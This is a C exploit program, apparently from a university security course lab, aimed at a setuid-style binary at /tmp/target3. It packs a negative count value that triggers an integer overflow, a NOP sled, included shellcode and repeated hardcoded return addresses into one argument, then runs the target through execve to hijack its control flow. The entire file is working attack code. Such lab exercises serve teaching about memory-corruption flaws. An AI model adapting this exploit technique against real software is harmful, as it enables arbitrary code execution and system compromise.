#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target3"
#define BSIZE 2752
#define NOP 0x90
#define JMP_ADDR 0xbfffeb10 //0xbfffeda0 //0xbffffd50

int main(void)
{
  char *args[3];
  char *buff;
  char *env[1];
  int bsize = BSIZE;
  int i;
  long *addr_ptr, addr;
  char* count = "-268435284";

  if (!(buff = malloc(bsize))) {
    printf("Can't allocate memory.\n");
    exit(0);
  }

  for(i=0; i<BSIZE; i++){
    if(i<strlen(count)) {
      *(buff+i) = count[i];
    } else if (i < (strlen(count) + 1)) {
      *(buff + i) = ',';
    } else if (i < 800 + strlen(count) + 1 - strlen(shellcode)) {
      *(buff + i) = NOP;
    } else if (i < 800 + strlen(count) + 1) {
      *(buff + i) = shellcode[i - 800 - strlen(count) - 1 + strlen(shellcode)];
    } else {
      break;
    }
  }
  addr = JMP_ADDR;
  addr_ptr = (long *) (buff + 800 + strlen(count) + 1);
  for(i=0;i+800+strlen(count)+1<bsize;i+=4) {
    *(addr_ptr++) = addr;
  }
  buff[bsize-1] = '\0';

  args[0] = TARGET; args[1] = buff; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
